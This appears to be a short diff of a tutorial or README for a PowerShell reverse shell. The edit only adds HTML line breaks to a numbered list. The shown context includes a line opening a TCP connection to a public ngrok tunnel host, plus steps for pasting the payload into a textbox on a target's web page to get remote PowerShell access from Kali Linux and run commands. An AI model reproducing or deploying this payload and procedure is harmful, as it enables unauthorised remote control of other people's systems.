@@ -135,13 +135,13 @@ add libraries which are needed<br/>
      $client = New-Object System.Net.Sockets.TCPClient("0.tcp.in.ngrok.io", 15660)
 
 # now payload has been created 
-  ##1.  now start ngrok server.
-  ##2.  open broswer and type ip address and click enter.
-  ##3.  now paste payload in textbox and then click send
-  ##4.  In 5 second you will get connetion of target system in kali linux.
-  ##5.  Then click enter. 
-  ##6.  now access of powershell has been to the kali linux.
-  ##7.  we can execute so many commands to the system.
+  ##1.  now start ngrok server. <br/>
+  ##2.  open broswer and type ip address and click enter.<br/>
+  ##3.  now paste payload in textbox and then click send<br/>
+  ##4.  In 5 second you will get connetion of target system in kali linux.<br/>
+  ##5.  Then click enter. <br/>
+  ##6.  now access of powershell has been to the kali linux.<br/>
+  ##7.  we can execute so many commands to the system.<br/>
   
 
 
